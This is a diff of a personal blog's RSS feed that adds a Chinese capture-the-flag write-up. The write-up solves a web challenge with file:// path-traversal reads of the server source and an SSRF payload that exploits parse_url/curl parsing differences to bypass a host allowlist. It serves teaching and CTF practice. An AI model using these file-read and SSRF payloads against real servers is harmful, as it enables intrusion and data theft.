@@ -6,7 +6,7 @@
         <description>Recent content on 茄子的养殖场</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Tue, 17 May 2022 21:55:19 +0800</lastBuildDate><atom:link href="https://proben1.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Wed, 18 May 2022 20:05:12 +0800</lastBuildDate><atom:link href="https://proben1.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>茄科生物观测日志</title>
         <link>https://proben1.github.io/2021/%E8%8C%84%E7%A7%91%E7%94%9F%E7%89%A9%E8%A7%82%E6%B5%8B%E6%97%A5%E5%BF%97/</link>
         <pubDate>Mon, 06 Dec 2021 12:08:35 +0800</pubDate>
@@ -92,6 +92,170 @@
 &lt;p&gt;最近是没时间玩游戏了，亏我还买了大表哥，无主之地，蔚蓝，还给龙脉唱歌加了愿望单，幸运的话大四之前可以全玩完？呜呜呜！&lt;/p&gt;
 &lt;p&gt;好好学习！打游戏可以再造个自己去玩？&lt;/p&gt;
 &lt;p&gt;（昨天素材太好了，忍不住记一下，详见2021-12-05）&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>KCTF2022春 4 飞蛾扑火</title>
+        <link>https://proben1.github.io/2022/kctf2022%E6%98%A5-4-%E9%A3%9E%E8%9B%BE%E6%89%91%E7%81%AB/</link>
+        <pubDate>Wed, 18 May 2022 20:05:12 +0800</pubDate>
+        
+        <guid>https://proben1.github.io/2022/kctf2022%E6%98%A5-4-%E9%A3%9E%E8%9B%BE%E6%89%91%E7%81%AB/</guid>
+        <description>&lt;p&gt;source:http://121.36.145.157:8044/&lt;/p&gt;
+&lt;p&gt;进去之后F12&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;html&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;head&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;utf-8&amp;#34;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;title&lt;/span&gt;&amp;gt;欢迎挑战 Design by 香草&amp;lt;/&lt;span style=&#34;color:#ff79c6&#34;&gt;title&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#ff79c6&#34;&gt;head&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;body&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&amp;lt;!--phpinfo.php--&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#ff79c6&#34;&gt;img&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;url.php?url=https://ctf.pediy.com/upload/team/762/team236762.png&amp;#34;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#ff79c6&#34;&gt;body&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#ff79c6&#34;&gt;html&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;提示了phpinfo，&lt;code&gt;http://121.36.145.157:8044/phpinfo.php&lt;/code&gt;直接进去了，查到路径： /var/www/html；协议&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Protocols&lt;/th&gt;
+&lt;th&gt;dict, file, ftp, ftps, gopher, http, https, imap, imaps, ldap, ldaps, pop3, pop3s, rtmp, rtsp, scp, sftp, smb, smbs, smtp, smtps, telnet, tftp&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;通过file协议查看源代码;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://121.36.145.157:8044/url.php?url=file://127.0.0.1/../../../../../../var/www/html/url.php&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-PHP&#34; data-lang=&#34;PHP&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;curl_request&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$data&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$method&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;get&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$header&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;content-type: application/json&amp;#34;&lt;/span&gt;), &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$https&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$timeout&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;5&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$method&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; strtoupper(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$method&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; curl_init();&lt;span style=&#34;color:#6272a4&#34;&gt;//初始化
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_URL, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;);&lt;span style=&#34;color:#6272a4&#34;&gt;//访问的URL
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_RETURNTRANSFER, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;);&lt;span style=&#34;color:#6272a4&#34;&gt;//只获取页面内容，但不输出
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$https&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_SSL_VERIFYPEER, &lt;span style=&#34;color:#ff79c6&#34;&gt;false&lt;/span&gt;);&lt;span style=&#34;color:#6272a4&#34;&gt;//https请求 不验证证书
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;        curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_SSL_VERIFYHOST, &lt;span style=&#34;color:#ff79c6&#34;&gt;false&lt;/span&gt;);&lt;span style=&#34;color:#6272a4&#34;&gt;//https请求 不验证HOST
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$method&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$method&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_POST, &lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;);&lt;span style=&#34;color:#6272a4&#34;&gt;//请求方式为post请求
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$method&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;PUT&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt; strtoupper(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$method&lt;/span&gt;) &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;DELETE&amp;#39;&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_CUSTOMREQUEST, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$method&lt;/span&gt;); &lt;span style=&#34;color:#6272a4&#34;&gt;//设置请求方式
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_POSTFIELDS, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$data&lt;/span&gt;);&lt;span style=&#34;color:#6272a4&#34;&gt;//请求数据
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_TIMEOUT, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$timeout&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    curl_setopt(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;, CURLOPT_HTTPHEADER, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$header&lt;/span&gt;); &lt;span style=&#34;color:#6272a4&#34;&gt;//模拟的header头
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;//curl_setopt($ch, CURLOPT_HEADER, false);//设置不需要头信息
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; curl_exec(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;);&lt;span style=&#34;color:#6272a4&#34;&gt;//执行请求
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    curl_close(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$ch&lt;/span&gt;);&lt;span style=&#34;color:#6272a4&#34;&gt;//关闭curl，释放资源
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;url&amp;#34;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$uu&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;parse_url(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$host&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$uu&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$uu&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$scheme&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;isset(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$uu&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;scheme&amp;#34;&lt;/span&gt;])&lt;span style=&#34;color:#ff79c6&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$uu&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;scheme&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#ff79c6&#34;&gt;empty&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$host&lt;/span&gt;)){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#ff79c6&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;host is null&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#ff79c6&#34;&gt;empty&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$scheme&lt;/span&gt;)){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#ff79c6&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;scheme is null&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;//https://ctf.pediy.com/upload/team/762/team236762.png?
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$host&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;ctf.pediy.com&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$host&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$host&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;//echo curl_request(&amp;#34;http://123.57.254.42/flag.php&amp;#34;,&amp;#34;get&amp;#34;,[],true,5);//get flag
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#ff79c6&#34;&gt;echo&lt;/span&gt; curl_request(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;get&amp;#34;&lt;/span&gt;,[],&lt;span style=&#34;color:#ff79c6&#34;&gt;true&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;5&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;host not allow&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;自定义了curl_request函数，但重点在parse_url上&lt;/p&gt;
+&lt;p&gt;自己试l 一下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;lt;?&lt;/span&gt;php
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#http://121.36.145.157:8044/url.php?url=123.57.254.42://localhost/../flag.php 先取出url
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;123.57.254.42://localhost/../flag.php&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$uu&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;parse_url(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$url&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$uu&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;host&amp;#34;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出是localhost&lt;/p&gt;
+&lt;p&gt;然后用了浏览器试了试，当我们访问&lt;code&gt;123.57.254.42://localhost/../flag.php&lt;/code&gt;，相当于访问&lt;code&gt;123.57.254.42//flag.php&lt;/code&gt;，但是这个url被parse_url解析时，host会被定位为localhost，成功绕过。&lt;/p&gt;
+&lt;p&gt;payload：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://121.36.145.157:8044/url.php?url=123.57.254.42://localhost/../flag.php
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;flag{xxx_999()xx*@eeEEE}&lt;/p&gt;
+&lt;p&gt;参考了下https://bbs.pediy.com/thread-272848.htm&lt;/p&gt;
+&lt;p&gt;考察为基础的SSRF以及 php &lt;code&gt;parse_url&lt;/code&gt; 和 curl 对 url 的解析规则不同。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;127.0.0.1://www.baidu.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;对于这种特殊的协议格式，就比较有意思
